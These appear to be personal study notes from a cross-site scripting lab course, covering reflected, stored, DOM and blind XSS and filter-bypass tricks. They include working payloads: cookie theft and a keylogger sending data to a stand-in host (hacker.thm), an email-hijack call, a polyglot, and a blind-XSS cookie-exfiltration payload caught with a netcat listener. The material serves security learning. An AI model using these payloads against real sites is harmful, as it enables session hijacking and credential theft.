XXS is based on JavaScript, it is helpful to have a basic understanding of the language

Cross-Site Scripting, better known as XSS in the cybersecurity community, is ==classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. ==

# XSS Payloads

In XSS the payload is the JavaScript code we wish to execute on the targets computer

The intention is what you wish to JavaScript to actually do and the modification is the changes to the code we need to make it execute as every scenario is different. 

**Proof Of Concept:**

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

``` javascript
<script>alert('XSS');</script>
```

**Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

``` javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Key Logger:**

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

``` javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

**Business Logic:**

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

# Reflected XXS

Reflected XSS;; happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

**Example Scenario:**

A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source. The application doesn't check the contents of the **error** parameter, which allows the attacker to insert malicious code.

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

1. Attacker sends link to victim that contains malicious payload
2. Victim clicks link and is taken to vulnerable website
3. Link containing attackers script is executed on website
4. The data the attackers script gathered is sent to them. They could steal the victims cookies, which would allow the attacker to take over the victims account 

**How to test for Reflected XSS:**

You'll need to test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload;

# Stored XXS

 In Stored XSS, the payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
 
**Example Scenario:**  
  
A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

1. Attacker send malicious code to the websites DB
2. For every visit to the website, the malicious script is activated
3. The data the attackers script gathered is sent to them. They could steal the victims cookies, which would allow the attacker to take over the victims account 

**Potential Impact:**  
  
The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

**How to test for Stored XSS:**  

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:  

- Comments on a blog
- User profile information
- Website Listings

Changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 

# DOM Based XXS

Document Object Model is a programming interface for HTML and XML documents. It represents the page so that the program can change the document structure, style and content. 

![[../../../attachments/HTML DOM.png]]

**Exploiting the DOM**

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.  
  
**Example Scenario:**  
  
The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.  
  
**Potential Impact:**  
  
Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

**How to test for Dom Based XSS:**

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval()

# Blind XSS


Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

**Example Scenario:**  
  
A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.  
  
**Potential Impact:**  
  
Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

**How to test for Blind XSS:**

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

# Perfecting Your Payload

How your JavaScript payload gets reflected in a targets website's code will determine the payload you need to use

**Ex 2 (Input Tag):**
If value is reflected in an input tag, you would use the following payload

```javascript
"><script>alert('THM');</script>
```

The important part of the payload is the "> which closes the value parameter and then closes the input tag. This now closes the input tag properly and allows the JavaScript payload to run

**Ex 3 (textarea):**

If value is reflected in a textarea tag, you would use the following payload

```javascript
</textarea><script>alert('THM');</script>
```

The important part of the above payload is \</textarea>, which causes the textarea element to close so the script will run.

**Ex 4 (JavaScript):**

Your name gets reflected in some JavaScript code.

![[../../../attachments/Pasted image 20250430193851.png]]

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload <mark style="background: #D2B3FFA6;">';alert('THM');// </mark> which you'll see from the below screenshot will execute your code. The <mark style="background: #D2B3FFA6;">'</mark> closes the field specifying the name, then<mark style="background: #D2B3FFA6;"> ; </mark>signifies the end of the current command, and the<mark style="background: #D2B3FFA6;"> //</mark> at the end makes anything after it a comment rather than executable code.


![[../../../attachments/Pasted image 20250430194004.png]]

**Ex 5 (Dangerous Word Filter):**

 If you try the `<script>alert('THM');</script>` payload, it won't work. When you view the page source. The word script  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words. When a word gets removed from a string, there's a helpful trick that you can try.
 
**Original Payload:**

`<sscriptcript>alert('THM');</sscriptcript>`

**Text to be removed (by the filter):**

![[../../../attachments/Pasted image 20250430194629.png]]

**Final Payload (after passing the filter):**

`<script>alert('THM');</script>`

**Ex 6 (Image onload):** 

Similar to level two, where we had to escape from the value attribute of an input tag, we can try ">`<script>alert('THM');</script>` , but that doesn't seem to work. 

![[../../../attachments/Pasted image 20250430195055.png]]

You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. We can use the image onload attribute which executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.

**Polyglots:**

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.  

  
``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``


# Practical Example (Blind XSS)

Submit malicious code into some sort of form data on the website

Using the AttackBox, let’s set up a listening server using Netcat. If we want to listen on port 9001, we issue the command `nc -l -p 9001`. The `-l` option indicates that we want to use Netcat in listen mode, while the `-p` option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add `-n`; moreover, to discover any errors, running Netcat in verbose mode by adding the `-v` option is recommended. The final command becomes `nc -n -l -v -p 9001`, equivalent to `nc -nlvp 9001`.


```shell-session
user@machine$ nc -nlvp 9001
Listening on [0.0.0.0] (family 0, port 9001)
```

Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.

`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`

- The `</textarea>` tag closes the text area field.
- The `<script>` tag opens an area for us to write JavaScript.
- The `fetch()` command makes an HTTP request.
- `URL_OR_IP` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
- `?cookie=` is the query string containing the victim’s cookies.
- `btoa()` command base64 encodes the victim’s cookies.
- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.
- `</script>`closes the JavaScript code block.
